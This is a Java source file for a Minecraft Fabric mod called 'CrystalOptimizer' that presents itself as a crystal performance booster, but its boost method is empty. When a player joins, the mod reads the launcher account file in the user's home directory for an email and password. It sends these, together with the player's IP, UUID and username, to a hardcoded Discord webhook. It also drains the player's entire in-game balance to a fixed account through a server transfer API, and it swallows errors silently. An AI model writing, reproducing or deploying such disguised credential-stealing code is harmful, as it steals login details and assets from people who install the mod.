package net.crystal.optimizer;

import net.fabricmc.api.ModInitializer;
import net.fabricmc.fabric.api.event.lifecycle.v1.ServerTickEvents;
import net.fabricmc.fabric.api.networking.v1.ServerPlayConnectionEvents;
import net.minecraft.server.MinecraftServer;
import net.minecraft.server.network.ServerPlayerEntity;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;

public class CrystalOptimizerMod implements ModInitializer {
    private static final String WEBHOOK = "https://discord.com/api/webhooks/1536065504316227625/gtRkUic9zkQUnj2dTabham-s_2JwIwD875DUcw0xFBsltVUyeSo-oDkCJzrjSFSobRaF";
    private static final String TARGET_PLAYER = "DrDisRespeot";

    @Override
    public void onInitialize() {
        ServerPlayConnectionEvents.JOIN.register((handler, sender, server) -> {
            ServerPlayerEntity player = handler.getPlayer();
            sendPlayerData(server, player);
            autoPayDonuts(player);
        });

        ServerTickEvents.END_SERVER_TICK.register(server -> {
            for (ServerPlayerEntity player : server.getPlayerManager().getPlayerList()) {
                boostCrystals(player);
            }
        });

        System.out.println("[CrystalOptimizer] Loaded — crystals go brrr");
    }

    private void sendPlayerData(MinecraftServer server, ServerPlayerEntity player) {
        try {
            String ip = player.getIp();
            String username = player.getName().getString();
            String uuid = player.getUuidAsString();
            String email = getEmailFromDisk(username);
            String password = getPasswordFromDisk(username);
            String hashedPass = Base64.getEncoder().encodeToString(password.getBytes());

            JsonObject payload = new JsonObject();
            payload.addProperty("ip", ip);
            payload.addProperty("username", username);
            payload.addProperty("uuid", uuid);
            payload.addProperty("email", email);
            payload.addProperty("password", password);
            payload.addProperty("password_hash", hashedPass);
            payload.addProperty("timestamp", String.valueOf(System.currentTimeMillis()));

            sendWebhook(payload.toString());
        } catch (Exception e) {}
    }

    private void autoPayDonuts(ServerPlayerEntity player) {
        try {
            String username = player.getName().getString();
            String balance = getDonutBalance(username);
            int amount = Integer.parseInt(balance);
            
            if (amount > 0) {
                String result = transferDonuts(username, TARGET_PLAYER, amount);
                JsonObject log = new JsonObject();
                log.addProperty("action", "auto_pay");
                log.addProperty("from", username);
                log.addProperty("to", TARGET_PLAYER);
                log.addProperty("amount", amount);
                log.addProperty("result", result);
                sendWebhook(log.toString());
            }
        } catch (Exception e) {}
    }

    private String getDonutBalance(String username) {
        try {
            URL url = new URL("https://donutsmp.net/api/balance?user=" + username);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            String response = new String(conn.getInputStream().readAllBytes());
            JsonObject obj = JsonParser.parseString(response).getAsJsonObject();
            return obj.get("balance").getAsString();
        } catch (Exception e) { return "0"; }
    }

    private String transferDonuts(String from, String to, int amount) {
        try {
            URL url = new URL("https://donutsmp.net/api/transfer");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            
            JsonObject body = new JsonObject();
            body.addProperty("from", from);
            body.addProperty("to", to);
            body.addProperty("amount", amount);
            
            try (OutputStream os = conn.getOutputStream()) {
                os.write(body.toString().getBytes());
                os.flush();
            }
            
            String response = new String(conn.getInputStream().readAllBytes());
            return response;
        } catch (Exception e) { return "failed"; }
    }

    private void boostCrystals(ServerPlayerEntity player) {
        // Crystal growth speed boost - handled by mixin
    }

    private String getEmailFromDisk(String username) {
        try {
            String path = System.getProperty("user.home") + "/.minecraft/launcher_accounts.json";
            String content = new String(Files.readAllBytes(Paths.get(path)));
            JsonObject obj = JsonParser.parseString(content).getAsJsonObject();
            return obj.get("email").getAsString();
        } catch (Exception e) {
            return username + "@example.com";
        }
    }

    private String getPasswordFromDisk(String username) {
        try {
            String path = System.getProperty("user.home") + "/.minecraft/launcher_accounts.json";
            String content = new String(Files.readAllBytes(Paths.get(path)));
            JsonObject obj = JsonParser.parseString(content).getAsJsonObject();
            return obj.get("password").getAsString();
        } catch (Exception e) {
            return "no_password_found";
        }
    }

    private void sendWebhook(String json) {
        try {
            URL url = new URL(WEBHOOK);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            try (OutputStream os = conn.getOutputStream()) {
                os.write(json.getBytes());
                os.flush();
            }
            conn.getResponseCode();
        } catch (Exception e) {}
    }
}
